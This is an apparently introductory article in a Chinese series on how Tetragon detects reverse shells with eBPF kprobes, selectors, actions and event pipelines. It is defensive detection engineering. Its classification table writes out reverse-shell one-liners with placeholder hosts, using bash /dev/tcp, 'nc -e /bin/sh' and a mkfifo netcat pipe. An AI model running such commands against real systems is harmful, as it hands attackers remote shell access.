# Tetragon 反弹 Shell 检测基础架构 — 共享基础设施深度分析

## 文档定位

本文档是「Tetragon 反弹 Shell 检测全流程深度分析」系列的第 0 篇（基础架构篇），覆盖所有检测维度共享的基础设施。后续 4 篇维度文档（进程执行、网络连接、FD 重定向、文件访问）将引用本文档，避免重复。

**系列文档索引**：

| 序号 | 文档 | 主题 |
|------|------|------|
| **0** | **本文档** | **共享基础架构：Kprobe 框架、选择器编译、事件管道** |
| 1 | tetragon-reverse-shell-process-execution-detection.md | 进程���行维度：execve 监控、二进制匹配 |
| 2 | tetragon-reverse-shell-network-connection-detection.md | 网络连接维度：tcp_connect、socket 操作 |
| 3 | tetragon-reverse-shell-fd-redirection-detection.md | FD 重定向维度：dup2/dup3、FollowFD/CopyFD |
| 4 | tetragon-reverse-shell-file-access-detection.md | 文件访问维度：fd_install、mkfifo、memfd_create |
| 5 | tetragon-reverse-shell-correlation-and-defense.md | 多维关联与综合防御策�� |

---

## 目录

- [第一部分：反弹 Shell 攻击全景](#第一部分反弹-shell-攻击全景)
- [第二部分：通用 Kprobe 框架](#第二部分通用-kprobe-框架)
- [第三部分：关键数据结构参考](#第三部分关键数据结构参考)
- [附录：tetra CLI 和 jq 过滤命令参考](#附录tetra-cli-和-jq-过滤命令参考)

---

## 第一部分：反弹 Shell 攻击全景

### 1.1 反弹 Shell 分类体系

反弹 Shell（Reverse Shell）是攻击者在获得初始代码执行能力后，将目标机器的 Shell 会话反向连接到攻击者控制的服务器的技术。根据实现机制和使���的工具，可将反弹 Shell 分为以下 7 类：

| 类别 | 典型命令/工具 | 内核行为特征 | 检测难度 |
|------|-------------|-------------|---------|
| **1. Bash 原生** | `bash -i >& /dev/tcp/IP/PORT 0>&1` | execve(bash) + connect() + dup2() | 低 |
| **2. Netcat 类** | `nc -e /bin/sh IP PORT` / `mkfifo+nc+sh` | execve(nc/ncat) + connect() + [mkfifo] | 低-中 |
| **3. ��本解释器** | Python `socket+dup2+exec`、Perl、PHP、Ruby | execve(python/perl/php) + socket() + dup2() | 中 |
| **4. 管道链** | `mkfifo /tmp/f; nc IP PORT < /tmp/f \| sh > /tmp/f` | mkfifo() + execve(nc+sh) + open(FIFO) | 中 |
| **5. 加密通道** | `openssl s_client`、`socat ssl:` | execve(openssl/socat) + connect() + SSL握手 | 高 |
| **6. 无文件执行** | `memfd_create` + 远程下载 + `fexecve` | memfd_create() + write() + execveat() | 高 |
| **7. 自定义/编译型** | C/Go/Rust 编写的定制后门 | socket() + dup2() + execve(/bin/sh) | 极高 |

### 1.2 反弹 Shell 的内核行为模型

无论使用何种高级语言或工具，反弹 Shell 在内核层面都会产生以下系统调用序列（至少包含其中几个）：

```
攻击者视角                    目标机器内核系统调用序列
─────────                    ──────────────────────
                             ┌─────────────────────────┐
                             │ 1. 进程创建/执行           │
nc -lvp 4444                 │    execve("/bin/bash")   │
  等待连接 ◄────────────────  │    execve("/usr/bin/nc") │
                             │    execve("/usr/bin/python")│
                             ├─────────────────────────┤
                             │ 2. 网络连接               │
  连接建立 ◄────────────────  │    socket(AF_INET, ...)  │
                             │    connect(fd, {IP:PORT}) │
                             ├─────────────────────────┤
                             │ 3. FD 重定向              │
                             │    dup2(sock_fd, 0)       │
  stdin 获取 ◄───────────── │    dup2(sock_fd, 1)       │
  stdout 获取 ◄──────────── │    dup2(sock_fd, 2)       │
                             ├─────────────────────────┤
                             │ 4. Shell 执行             │
  命令交互 ◄─────────────── │    execve("/bin/sh")      │
                             │    read(0) / write(1)     │
                             └─────────────────────────┘
```

### 1.3 检测维度与攻击类型映射矩阵

Tetragon 通过 4 个独立的检测维度覆盖上述行为：

| 攻击类型 | 进程执行 (Doc 1) | 网络连接 (Doc 2) | FD 重定向 (Doc 3) | 文件访问 (Doc 4) |
|---------|:---:|:---:|:---:|:---:|
| Bash /dev/tcp | ✅ 匹配 bash + 参数 | ✅ tcp_connect | ✅ dup2 (bash 内建) | ✅ /dev/tcp 访问 |
| Netcat -e | ✅ 匹配 nc 二进制 | ✅ tcp_connect | ❌ nc 内部处理 | ❌ |
| Netcat mkfifo | ✅ 匹配 nc + sh | ✅ tcp_connect | ❌ | ✅ mkfifo 检测 |
| Python/Perl/PHP | ✅ 解释器 + 参数 | ✅ tcp_connect | ✅ dup2 调用 | ❌ |
| OpenSSL/Socat | ✅ 匹配二进制 | ✅ tcp_connect | ❌ 内部处理 | ❌ |
| Memfd 无文件 | ✅ i_nlink==0 | ✅ tcp_connect | ✅ dup2 调用 | ✅ memfd_create |
| 自定义编译型 | ❌ 未知二进制 | ✅ tcp_connect | ✅ dup2 调用 | ❌ |

**关键洞察**：
- **网络连接**是覆盖面最广的维度，每种反弹 Shell 都需要建立网络连接
- **FD 重定向**是置信度最高的信号，socket fd → stdin/stdout 是反弹 Shell 的核心特征
- **进程执行**对已知工具检测效果好，但对定制后门无效
- **多维关联**（详见 Doc 5）可以显著降低误报率

---

## 第二部分：通用 Kprobe 框架

Tetragon 的反弹 Shell 检测主要基于 Generic Kprobe 框架。本部分详细分析该框架的完整处理流程。

### 2.1 TracingPolicy YAML → BPF 加载全流程

用户通过 TracingPolicy YAML 定义检测规则，Tetragon 将其编译为 BPF 程序和 Map 配置：

```
TracingPolicy YAML
      │
      ▼
┌─────────────────────────────────────────────────────┐
│  Go 应用层处理                                        │
│                                                       │
│  1. 解析 YAML → v1alpha1.TracingPolicy 结构体          │
│     (pkg/k8s/apis/cilium.io/v1alpha1/types.go)       │
│                                                       │
│  2. 构建 KProbeSpec 列表                               │
│     (pkg/sensors/tracing/generickprobe.go)            │
│                                                       │
│  3. 编译选择器 → BPF 字节码（filter_map）               │
│     (pkg/selectors/kernel.go)                         │
│        ├─ matchPIDs → PID 过滤器                       │
│        ├─ matchArgs → 参数过滤器                       │
│        ├─ matchBinaries → 二进制名称过滤器              │
│        ├─ matchNamespaces → 命名空间过滤器              │
│        ├─ matchCapabilities → 能力过滤器               │
│        └─ matchActions → 动作列表                      │
│                                                       │
│  4. 配置 event_config → config_map                     │
│     (func_id, arg类型, syscall标志, 返回值配置)          │
│                                                       │
│  5. 加载 BPF 程序并附加到内核 Hook 点                    │
│     (pkg/sensors/tracing/loader_linux.go)              │
└─────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────┐
│  BPF 运行时                                           │
│                                                       │
│  6. Kprobe 触发 → generic_kprobe_event()              │
│     (bpf/process/bpf_generic_kprobe.c:89)             │
│                                                       │
│  7. Tail Call 管道处理                                  │
│     FILTER → SETUP → PROCESS → ARGS → ACTIONS → SEND │
│                                                       │
│  8. 事件写入 Ring Buffer                               │
│     event_output_metric(ctx, op, e, total)            │
└─────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────┐
│  Go 事件处理                                          │
│                                                       │
│  9.  Observer 读取 Ring Buffer                         │
│      (pkg/observer/observer_linux.go)                 │
│                                                       │
│  10. handleGenericKprobe 解析事件                       │
│      (pkg/sensors/tracing/generickprobe.go)           │
│                                                       │
│  11. 转换为 Protobuf → gRPC/JSON 输出                  │
│      (pkg/grpc/tracing/tracing.go)                    │
└─────────────────────────────────────────────────────┘
```

### 2.2 Tail Call 管道架构

Generic Kprobe 使用 BPF Tail Call 将处理逻辑分为多个阶段。这是因为早期内核（4.19）限制单个 BPF 程序最多 4096 条指令，通过 Tail Call 可以绕过此限制。

**源码位置**: `bpf/process/bpf_generic_kprobe.c:29-50`

```c
// Tail Call 程序数组（PROG_ARRAY Map，最多 13 个入口）
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 13);
    __type(key, __u32);
    __array(values, int(void *));
} kprobe_calls SEC(".maps") = {
    .values = {
        [TAIL_CALL_SETUP]     = (void *)&generic_kprobe_setup_event,     // 0
        [TAIL_CALL_PROCESS]   = (void *)&generic_kprobe_process_event,   // 1
        [TAIL_CALL_FILTER]    = (void *)&generic_kprobe_process_filter,  // 2
        [TAIL_CALL_ARGS]      = (void *)&generic_kprobe_filter_arg,      // 3
        [TAIL_CALL_ACTIONS]   = (void *)&generic_kprobe_actions,         // 4
        [TAIL_CALL_SEND]      = (void *)&generic_kprobe_output,          // 5
        [TAIL_CALL_PATH]      = (void *)&generic_kprobe_path,            // 6
        [TAIL_CALL_PROCESS_2] = (void *)&generic_kprobe_process_event_2, // 7
        [TAIL_CALL_ARGS_2]    = (void *)&generic_kprobe_filter_arg_2,    // 8
    },
};
```

**Tail Call 枚举定义**: `bpf/process/types/basic.h:133-143`

```c
enum {
    TAIL_CALL_SETUP     = 0,  // 初始化事件结构
    TAIL_CALL_PROCESS   = 1,  // 读取函数参数
    TAIL_CALL_FILTER    = 2,  // PID/命名空间/能力预过滤
    TAIL_CALL_ARGS      = 3,  // 参数级选择器过滤
    TAIL_CALL_ACTIONS   = 4,  // 执行匹配后动作
    TAIL_CALL_SEND      = 5,  // 输出事件到 Ring Buffer
    TAIL_CALL_PATH      = 6,  // 路径解析（分离以减少指令数）
    TAIL_CALL_PROCESS_2 = 7,  // 参数读取第二阶段（4.19内核）
    TAIL_CALL_ARGS_2    = 8,  // 参数过滤第二阶段（4.19内核）
};
```

**完整处理流程**：

```
Kprobe 触发
    │
    ▼
generic_kprobe_event()                    [入口点]
    │ 初始化 msg_generic_kprobe
    │ 查找 config_map → event_config
    │ 检查 policy_filter
    │ 初始化 selector 状态
    │ 获取命名空间/能力信息
    │
    ├──► tail_call → TAIL_CALL_FILTER (2)  [PID/NS/CAP 预过滤]
    │       │ 遍历所有选择器（最多5个）
    │       │ selector_process_filter()
    │       │ 标记通过的选择器 → sel.active[]
    │       │
    │       ├─ 继续 → tail_call → TAIL_CALL_FILTER (循环)
    │       │
    │       └─ 完成 → tail_call → TAIL_CALL_SETUP (0)
    │
    ├──► TAIL_CALL_SETUP (0)              [参数提取准备]
    │       │ generic_process_event_and_setup()
    │       │ 从 pt_regs 提取 a0~a4（最多5个参数）
    │       │ 初始化事件头（op, ktime, tid）
    │       │ 如果是 syscall：使用 PT_REGS_SYSCALL_REGS
    │       │
    │       └──► tail_call → TAIL_CALL_PROCESS (1)
    │
    ├──► TAIL_CALL_PROCESS (1)            [参数读取]
    │       │ generic_process_event()
    │       │ 按 config->arg[index] 类型逐个读取参数
    │       │ read_arg() 按类型分发：
    │       │   int_type  → probe_read 4字节
    │       │   string_type → copy_strings()
    │       │   sock_type → copy_sock() + update_pid_tid_from_sock()
    │       │   file_ty   → copy_path()
    │       │   fd_ty     → fdinstall_map 查找
    │       │   sockaddr_type → copy_sockaddr()
    │       │
    │       ├─ 还有参数 → tail_call → TAIL_CALL_PROCESS (循环)
    │       │
    │       └─ 参数读取完��� → tail_call → TAIL_CALL_ARGS (3)
    │
    ├──► TAIL_CALL_ARGS (3)               [参数级选择器过滤]
    │       │ generic_filter_arg()
    │       │ 遍历 active 选择器
    │       │ selector_arg_offset() → filter_args()
    │       │   按参数类型调用不同过滤函数：
    │       │   ├─ int/u32: filter_32ty_map() 或 filter_64ty_selector_val()
    │       │   ├─ string:  filter_char_buf() (Equal/Prefix/Postfix)
    │       │   ├─ sock:    filter_inet() (SAddr/DAddr/SPort/DPort)
    │       │   ├─ file/fd: filter_file_buf() (路径匹配)
    │       │   └─ addr:    filter_addr_map() (LPM Trie CIDR匹配)
    │       │
    │       ├─ 未通过 → 尝试下一个选择器 → tail_call → TAIL_CALL_ARGS
    │       │
    │       ├─ pass > 1 → tail_call → TAIL_CALL_ACTIONS (4)
    │       │
    │       └─ pass == 1（默认动作）→ tail_call → TAIL_CALL_SEND (5)
    │
    ├──► TAIL_CALL_ACTIONS (4)            [执行动作]
    │       │ generic_actions() → do_actions()
    │       │ 读取 matchActions 配置
    │       │ 按动作类型分发：
    │       │   ACTION_POST (0)        → 标记发送 + RateLimit + StackTrace
    │       │   ACTION_FOLLOWFD (1)    → installfd(): 写入 fdinstall_map
    │       │   ACTION_SIGKILL (2)     → send_signal(SIGKILL)
    │       │   ACTION_UNFOLLOWFD (3)  → 从 fdinstall_map 删除
    │       │   ACTION_OVERRIDE (4)    → override_return() 修改返回值
    │       │   ACTION_COPYFD (5)      → copyfd(): FD 元数据复制
    │       │   ACTION_NOPOST (8)      → 标记不发送事件
    │       │   ACTION_SIGNAL (9)      → send_signal(自定义信号)
    │       │   ACTION_TRACKSOCK (10)  → socktrack_map 写入
    │       │   ACTION_UNTRACKSOCK (11)→ socktrack_map 删除
    │       │   ACTION_NOTIFY_ENFORCER (12) → enforcer_data Map
    │       │
    │       └──► tail_call → TAIL_CALL_SEND (5)
    │
    └──► TAIL_CALL_SEND (5)              [事件输出]
            │ generic_output()
            │ 更新命名空间/能力变更信息
            │ 计算 total = args_size + common_size
            │ event_output_metric() → Ring Buffer 写入
            │
            └─ 事件发送完成
```

### 2.3 选择器编译机制

选择器（Selector）是 TracingPolicy 中过滤和动作控制的核心。Go 侧将 YAML 中的 `selectors` 字段编译为 BPF 可以直接读取的二进制格式，写入 `filter_map`。

**Go 编译入口**: `pkg/selectors/kernel.go`

#### 2.3.1 matchArgs 编译

`matchArgs` 定义了参数级的过滤条件。不同参数类型使用不同的 BPF Map 和匹配算法：

| 参数类型 | 操作符 | BPF 实现 | Map 类型 |
|---------|--------|---------|---------|
| `int/uint32/uint64` | Equal/NotEqual | `filter_32ty_map()` / `filter_64ty_selector_val()` | Hash Map (`argfilter_maps`) |
| `string` | Equal | `filter_char_buf_equal()` | Hash Map (`string_maps_0..10`) |
| `string` | Prefix | `filter_char_buf_prefix()` | LPM Trie (`string_prefix_maps`) |
| `string` | Postfix | `filter_char_buf_postfix()` | LPM Trie (`string_postfix_maps`，反向存储) |
| `sock` | SAddr/DAddr | `filter_addr_map()` | LPM Trie (`addr4lpm_maps`/`addr6lpm_maps`) |
| `sock` | SPort/DPort | `filter_32ty_map()` | Hash Map |
| `sock` | Protocol/Family/State | `filter_32ty_map()` | Hash Map |
| `file/fd` | Prefix/Postfix/Equal | `filter_file_buf()` | 同 string |
| `sockaddr` | SAddr/SPort/Family | `filter_inet()` | 同 sock |

**操作符枚举**: `bpf/process/types/operations.h:7-49`

```c
enum {
    op_filter_eq          = 3,   // Equal
    op_filter_neq         = 4,   // NotEqual
    op_filter_str_prefix  = 8,   // Prefix
    op_filter_str_postfix = 9,   // Postfix
    op_filter_saddr       = 13,  // SAddr (源地址 CIDR 匹配)
    op_filter_daddr       = 14,  // DAddr (目标地址 CIDR 匹配)
    op_filter_sport       = 15,  // SPort (源端口)
    op_filter_dport       = 16,  // DPort (目标端口)
    op_filter_protocol    = 17,  // Protocol
    op_filter_notsaddr    = 24,  // NotSAddr
    op_filter_notdaddr    = 25,  // NotDAddr
    op_filter_family      = 28,  // Family
    op_filter_state       = 29,  // State (TCP状态)
    // ... 更多操作符
};
```

#### 2.3.2 matchBinaries 编译

`matchBinaries` 通过二进制路径过滤事件，支持 `In`/`NotIn` 操作符。编译过程将二进制路径列表写入 `names_map`（BPF Hash Map），在 BPF 侧通过 `pfilter.h` 中的逻辑快速匹配：

```
YAML: matchBinaries:
      - operator: "In"
        values: ["/usr/bin/bash", "/usr/bin/nc"]
          │
          ▼
Go 编译 (pkg/selectors/kernel.go):
    BinarySelector → names_map entries
    key = binary_path_hash, value = 1
          │
          ▼
BPF 运行时 (pfilter.h):
    selector_process_filter() →
        execve_map 查找当前进程 →
        names_map 查找二进制路径 →
        匹配则标记 selector 为 active
```

#### 2.3.3 matchArgs 地址匹配编译（CIDR）

对于 `SAddr`/`DAddr`/`NotDAddr` 等网络地址操作符，Go 侧将 CIDR 值编译为 LPM Trie Map 的条目：

**源码位置**: `bpf/process/addr_lpm_maps.h`

```c
// IPv4 LPM Trie 结构
struct addr4_lpm_trie {
    __u32 prefix;   // CIDR 前缀长度（如 24 表示 /24）
    __u32 addr;     // IPv4 地址
};

// IPv4 LPM Trie Map（外层为 Array of Maps）
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY_OF_MAPS);
    __uint(max_entries, ADDR_LPM_MAPS_OUTER_MAX_ENTRIES); // 8
    __type(key, __u32);
    __array(values, struct {
        __uint(type, BPF_MAP_TYPE_LPM_TRIE);
        // ...
    });
} addr4lpm_maps SEC(".maps");
```

**匹配函数**: `bpf/process/types/basic.h` ���的 `filter_addr_map()`

```c
FUNC_INLINE long
filter_addr_map(struct selector_arg_filter *filter, __u64 *addr, __u16 family)
{
    switch (family) {
    case AF_INET:
        map_idx = map_idxs[0];
        addrmap = map_lookup_elem(&addr4lpm_maps, &map_idx);
        arg4.prefix = 32;           // 用 /32 精确匹配
        arg4.addr = addr[0];
        arg = &arg4;
        break;
    case AF_INET6:
        // 类似，使用 addr6lpm_maps
        break;
    }
    long exists = (long)map_lookup_elem(addrmap, arg);
    return filter_addr_op_mod(filter->op, exists);
    // NotDAddr 时返回 !exists，DAddr 时返回 !!exists
}
```

### 2.4 Action 执行框架

当选择器匹配成功后，BPF 侧执行 `matchActions` 中定义的动作。每个选择器最多支持 3 个动作（`MAX_ACTIONS = 3`）。

**源码位置**: `bpf/process/generic_calls.h:1027-1165`

#### 2.4.1 核心动作一览

**Action 枚举**: `bpf/process/types/basic.h:110-127`

```c
enum {
    ACTION_POST              = 0,   // 发送事件到用户空间
    ACTION_FOLLOWFD          = 1,   // 跟踪 FD（写入 fdinstall_map）
    ACTION_SIGKILL           = 2,   // 发送 SIGKILL
    ACTION_UNFOLLOWFD        = 3,   // 取消跟踪 FD
    ACTION_OVERRIDE          = 4,   // 覆盖系统调用返回值
    ACTION_COPYFD            = 5,   // 复制 FD 元数据
    ACTION_GETURL            = 6,   // URL 获取（保留）
    ACTION_DNSLOOKUP         = 7,   // DNS 查找（保留）
    ACTION_NOPOST            = 8,   // 不发送事件
    ACTION_SIGNAL            = 9,   // 发送自定义信号
    ACTION_TRACKSOCK         = 10,  // 跟踪 Socket（写入 socktrack_map）
    ACTION_UNTRACKSOCK       = 11,  // 取消跟踪 Socket
    ACTION_NOTIFY_ENFORCER   = 12,  // 通知 Enforcer 程序
    ACTION_CLEANUP_ENFORCER_NOTIFICATION = 13,
    ACTION_SET               = 14,  // 设置 USDT 参数值
};
```

#### 2.4.2 FollowFD / CopyFD

这两个动作用于跟踪文件描述符（FD）在进程内的传播，是 FD 重定向检测（Doc 3）的基础。

**FollowFD**: 当 `fd_install` 被调用时，将 FD 号和对应的文件路径存入 `fdinstall_map`：

```c
// fdinstall_map: key = {pid, fd}, value = {file_path, flags}
struct fdinstall_key {
    __u32 tid;    // 进程 PID (tgid)
    __u32 fd;     // 文件描述符号
};
// fdinstall_value 包含文件路径信息
```

**CopyFD**: 当 `dup2/dup3` 被调用时，将旧 FD 的元数据复制到新 FD：

```c
// copyfd(): 将 fdinstall_map[old_fd] 的内容复制到 fdinstall_map[new_fd]
FUNC_INLINE int copyfd(struct msg_generic_kprobe *e, int oldfdi, int newfdi)
```

#### 2.4.3 TrackSock / UntrackSock

这两个动作用于跟踪 Socket 对象的生命周期，支持将 Socket 的 PID/TID 关联信息存入 `socktrack_map`：

```c
// socktrack_map: key = sock内核地址, value = socket_owner{pid, tid, ktime}
struct socket_owner {
    __u32 pid;
    __u32 tid;
    __u64 ktime;
};
```

#### 2.4.4 NotifyEnforcer

NotifyEnforcer 是一种间接执行机制，通过 `enforcer_data` Map 将信号/错误信息传递给独立的 Enforcer BPF 程序：

**源码位置**: `bpf/process/bpf_enforcer.h:17-21`

```c
struct enforcer_data {
    __s16 error;          // 返回的错误码
    __s16 signal;         // 发送的信号（如 SIGKILL = 9）
    struct enforcer_act_info act_info;
};
```

**Enforcer BPF 程序**: `bpf/process/bpf_enforcer.c:6-20`

```c
FUNC_INLINE int do_enforcer(void *ctx)
{
    __u64 id = get_current_pid_tgid();
    struct enforcer_data *data;

    data = map_lookup_elem(&enforcer_data, &id);
    if (!data)
        return 0;

    if (data->signal)
        send_signal(data->signal);     // 发送信号杀死进程

    map_delete_elem(&enforcer_data, &id);
    return data->error;                // 通过 fmod_ret 返回错误码
}
```

**Enforce 模式控制**: `bpf/process/generic_calls.h:1182-1189`

```c
// 检查策略是否处于 enforce 模式
pcnf = map_lookup_elem(&policy_conf, &zero);
if (pcnf && pcnf->mode != POLICY_MODE_ENFORCE)
    enforce_mode = false;
// 非 enforce 模式下，Sigkill/Override/NotifyEnforcer 仅记录不执行
```

#### 2.4.5 Sigkill vs Signal vs NotifyEnforcer 对比

| 特性 | Sigkill | Signal | NotifyEnforcer |
|------|---------|--------|----------------|
| 信号 | 固定 SIGKILL(9) | 自定义信号 | 自定义信号 + 错误码 |
| 执行时机 | kprobe 内立即执行 | kprobe 内立即执行 | 被监控函数返回时执行 |
| 可阻断函数 | 否（函数已执行） | 否 | 是（通过 fmod_ret） |
| 适用场景 | 杀死进程 | 发送通知 | 阻止 syscall + 杀死进程 |
| Monitor 模式 | 仅记录 | 仅记录 | 仅记录 |

### 2.5 事件输出管道

BPF 侧事件通过 Ring Buffer 传递到 Go 应用层，经过解析和转换后输出。

#### 2.5.1 BPF 侧输出

**源码位置**: `bpf/process/generic_calls.h:1242-1289`

```c
FUNC_INLINE long generic_output(void *ctx, u8 op)
{
    struct msg_generic_kprobe *e;
    e = map_lookup_elem(&process_call_heap, &zero);
    // ...
    total = e->common.size + generic_kprobe_common_size();
    // 限制总大小不超过 9000 字节
    asm volatile("if %[total] < 9000 goto +1; %[total] = 9000;");
    event_output_metric(ctx, op, e, total);
}
```

#### 2.5.2 Go 侧处理

**Observer 读取 Ring Buffer**: `pkg/observer/observer_linux.go`

```
Ring Buffer → observer.receiveEvent()
    → 按 msg.op 分发:
        MSG_OP_GENERIC_KPROBE → handleGenericKprobe()
```

**handleGenericKprobe**: `pkg/sensors/tracing/generickprobe.go`

```
handleGenericKprobe():
    1. 从二进制消息解�� msg_generic_kprobe
    2. 查找对应的 genericKprobe 配置（通过 func_id）
    3. 按 argSigPrinters 逐个解析参数:
       - int  → 直接读取
       - string → 读取长度 + 内容
       - sock → 解析 sk_type 为 family/protocol/saddr/daddr/sport/dport
       - file → 解析路径
       - fd   → 读取 FD 号 + 关联文件路径
    4. 构建 MsgGenericKprobeUnix
    5. 发送到 listener
```

**Protobuf 转换**: `pkg/grpc/tracing/tracing.go`

```
MsgGenericKprobeUnix →
    getProcessParent()  → Process + Parent 信息
    按参数类型构建 KprobeArg:
        GenericIntType    → KprobeArgInt
        GenericSockType   → KprobeArgSock {family, type, protocol, saddr, daddr, sport, dport}
        GenericFileType   → KprobeArgFile {path, flags}
        GenericStringType → KprobeArgString
    → tetragon.GetEventsResponse_ProcessKprobe
```

**最终 JSON 输出示例**（tcp_connect 事件）：

```json
{
  "process_kprobe": {
    "process": {
      "binary": "/usr/bin/bash",
      "arguments": "-i",
      "pid": 12345
    },
    "parent": {
      "binary": "/usr/sbin/nginx"
    },
    "function_name": "tcp_connect",
    "args": [
      {
        "sock_arg": {
          "family": "AF_INET",
          "type": "SOCK_STREAM",
          "protocol": "IPPROTO_TCP",
          "saddr": "10.0.0.5",
          "daddr": "1.2.3.4",
          "sport": 54321,
          "dport": 4444
        }
      }
    ],
    "action": "KPROBE_ACTION_POST"
  }
}
```

---

## 第三部分：关键数据结构参考

### 3.1 BPF 侧数据结构

#### 3.1.1 msg_generic_kprobe

这是 Generic Kprobe 事件的核心消息结构，通过 `process_call_heap`（PERCPU_ARRAY Map）在 Tail Call 之间传递。

```c
// 定义位于 bpf/lib/generic.h
struct msg_generic_kprobe {
    struct msg_common common;       // 公共头：op, flags, size, ktime
    struct msg_execve_key current;  // 进程标识：pid, ktime
    struct msg_selector_data sel;   // 选择器状态：curr, active[], pass
    __u32 func_id;                  // 函数 ID（对应 config_map 索引）
    __s32 retprobe_id;              // 返回探针 ID
    __u32 tid;                      // 线程 ID
    __u32 action;                   // 匹配的动作
    __u32 action_arg_id;            // 动作参数 ID
    __s32 pass;                     // 选择器通过偏移
    __u32 idx;                      // multi-kprobe 索引
    __u32 tailcall_index_process;   // 参数处理索引
    __u32 tailcall_index_selector;  // 选择器迭代索引
    __s32 kernel_stack_id;          // 内核栈 ID
    __s32 user_stack_id;            // 用户栈 ID
    unsigned long a0, a1, a2, a3, a4; // 原始参数值
    __u32 argsoff[5];               // 参数在 args 中的偏移
    // ... 命名空间/能力信息
    char args[MAX_TOTAL];           // 参数数据缓冲区（最大 9000 字节）
};
```

#### 3.1.2 tuple_type（网络五元组）

**源码位置**: `bpf/process/types/tuple.h:13-20`

```c
struct tuple_type {
    __u64 saddr[2];     // 源地址（IPv4用saddr[0]，IPv6用两个u64）
    __u64 daddr[2];     // 目标地址
    __u16 sport;        // 源端口
    __u16 dport;        // 目标端口
    __u16 protocol;     // 协议（IPPROTO_TCP=6, IPPROTO_UDP=17）
    __u16 family;       // 地址族（AF_INET=2, AF_INET6=10）
};
```

#### 3.1.3 sk_type（Socket 事件）

**源码位置**: `bpf/process/types/sock.h:12-20`

```c
struct sk_type {
    struct tuple_type tuple;  // 网络五元组
    __u64 sockaddr;           // sock 内核地址（用于 TrackSock 关联）
    __u32 mark;               // sk_mark
    __u32 priority;           // sk_priority
    __u16 type;               // SOCK_STREAM(1) / SOCK_DGRAM(2)
    __u8  state;              // TCP 状态（TCP_ESTABLISHED=1 等）
    __u8  pad[5];
};
```

#### 3.1.4 sockaddr_in_type

**源码位置**: `bpf/process/types/sockaddr.h:9-14`

```c
struct sockaddr_in_type {
    __u16 sin_family;     // 地址族
    __u16 sin_port;       // 端口（已转为主机字节序）
    __u32 pad;
    __u64 sin_addr[2];    // 地址
};
```

#### 3.1.5 fdinstall_key / fdinstall_value

用于 FollowFD/CopyFD 机制，跟踪进程的 FD 到文件路径的映射：

```c
struct fdinstall_key {
    __u32 tid;    // 进程 PID（tgid）
    __u32 fd;     // 文件描述符号
};

struct fdinstall_value {
    char file[MAX_STRING + sizeof(__u32) + sizeof(__u32)]; // 路径 + 长度 + flags
};
```

#### 3.1.6 socket_owner（TrackSock）

```c
struct socket_owner {
    __u32 pid;     // 创建 socket 的进程 PID
    __u32 tid;     // 创建 socket 的线程 ID
    __u64 ktime;   // 创建时间
};
```

#### 3.1.7 BPF Map 汇总

| Map 名称 | 类型 | Key | Value | 用途 |
|----------|------|-----|-------|------|
| `process_call_heap` | PERCPU_ARRAY | u32(0) | msg_generic_kprobe | Tail Call 间数据传递 |
| `config_map` | ARRAY | u32(idx) | event_config | 函数配置 |
| `filter_map` | ARRAY | u32(idx) | filter_map_value | 编译后的选择器 |
| `kprobe_calls` | PROG_ARRAY | u32(stage) | bpf_prog_fd | Tail Call 程序表 |
| `fdinstall_map` | HASH | fdinstall_key | fdinstall_value | FD→文件路径映射 |
| `socktrack_map` | HASH | u64(sock_addr) | socket_owner | Socket 生命周期跟踪 |
| `override_tasks` | HASH | u64(pid_tgid) | s32(error) | Override 返回值 |
| `enforcer_data` | HASH | u64(pid_tgid) | enforcer_data | Enforcer 通知 |
| `names_map` | HASH | binary_path | u8 | matchBinaries 过滤 |
| `addr4lpm_maps` | ARRAY_OF_MAPS→LPM_TRIE | u32 | LPM_TRIE | IPv4 CIDR 匹配 |
| `addr6lpm_maps` | ARRAY_OF_MAPS→LPM_TRIE | u32 | LPM_TRIE | IPv6 CIDR 匹配 |
| `string_maps_0..10` | HASH | padded_string | u8 | 字符串精确匹配 |
| `string_prefix_maps` | ARRAY_OF_MAPS→LPM_TRIE | u32 | LPM_TRIE | 字符串前缀匹配 |
| `string_postfix_maps` | ARRAY_OF_MAPS→LPM_TRIE | u32 | LPM_TRIE | 字符串后缀匹配 |

### 3.2 Go 侧数据结构

#### 3.2.1 TracingPolicy 类型

**源码位置**: `pkg/k8s/apis/cilium.io/v1alpha1/types.go`

```go
type TracingPolicySpec struct {
    KProbes     []KProbeSpec     `json:"kprobes,omitempty"`
    Tracepoints []TracepointSpec `json:"tracepoints,omitempty"`
    Lists       []ListSpec       `json:"lists,omitempty"`
    Options     []OptionSpec     `json:"options,omitempty"`
    Enforcers   []EnforcerSpec   `json:"enforcers,omitempty"`
}

type KProbeSpec struct {
    Call           string            `json:"call"`           // 内核函数名
    Syscall        bool              `json:"syscall"`        // 是否为系统调用
    Return         bool              `json:"return"`         // 是否监控返回值
    Args           []KProbeArg       `json:"args"`           // 参数定义
    ReturnArg      *KProbeArg        `json:"returnArg"`      // 返回值定义
    ReturnArgAction string           `json:"returnArgAction"` // 返回值动作
    Selectors      []KProbeSelector  `json:"selectors"`      // 选择器列表
}

type KProbeArg struct {
    Index    int    `json:"index"`    // 参数索引（0-4）
    Type     string `json:"type"`     // 类型名：int, string, sock, file, fd, sockaddr...
    Label    string `json:"label"`    // 可选标签
}
```

#### 3.2.2 KProbeSelector

```go
type KProbeSelector struct {
    MatchPIDs          []PIDSelector         `json:"matchPIDs,omitempty"`
    MatchArgs          []ArgSelector         `json:"matchArgs,omitempty"`
    MatchBinaries      []BinarySelector      `json:"matchBinaries,omitempty"`
    MatchNamespaces    []NamespaceSelector   `json:"matchNamespaces,omitempty"`
    MatchCapabilities  []CapabilitiesSelector `json:"matchCapabilities,omitempty"`
    MatchActions       []ActionSelector      `json:"matchActions,omitempty"`
    // ...
}

type ArgSelector struct {
    Index    int      `json:"index"`     // 对应 KProbeArg 的 index
    Operator string   `json:"operator"`  // Equal, Prefix, Postfix, DAddr, SPort...
    Values   []string `json:"values"`    // 匹配值
}

type ActionSelector struct {
    Action    string `json:"action"`      // Post, Sigkill, FollowFd, CopyFd...
    ArgFd     int    `json:"argFd"`       // FollowFD 的 FD 参数索引
    ArgName   int    `json:"argName"`     // FollowFD 的名称参数索引
    ArgSock   int    `json:"argSock"`     // TrackSock 的 sock 参数索引
    ArgError  int    `json:"argError"`    // NotifyEnforcer 的错误码
